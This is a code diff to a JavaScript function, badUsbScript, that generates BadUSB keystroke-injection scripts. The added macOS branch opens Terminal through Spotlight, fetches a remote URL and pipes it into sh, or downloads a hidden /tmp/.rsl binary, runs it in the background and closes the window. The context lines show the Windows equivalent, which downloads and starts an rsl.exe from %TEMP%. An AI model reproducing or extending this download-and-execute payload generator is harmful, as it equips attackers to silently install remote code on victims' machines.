@@ -946,6 +946,21 @@ function badUsbScript() {
       lines.push(`STRING $r="${url}"; $o="$env:TEMP\\rsl.exe"; (New-Object Net.WebClient).DownloadFile($r,$o); Start-Process $o`);
     }
     lines.push("ENTER");
+  } else if (isMac) {
+    lines.push("GUI SPACE");
+    lines.push("DELAY 500");
+    lines.push("STRING terminal");
+    lines.push("DELAY 200");
+    lines.push("ENTER");
+    lines.push("DELAY 800");
+    if (useLoader) {
+      lines.push("STRING curl -sL '" + url + "' | sh &");
+    } else {
+      lines.push("STRING curl -sL '" + url + "' -o /tmp/.rsl && chmod +x /tmp/.rsl && /tmp/.rsl &");
+    }
+    lines.push("ENTER");
+    lines.push("DELAY 200");
+    lines.push("GUI w");
   } else {
     lines.push("CTRL ALT t");
     lines.push("DELAY 800");
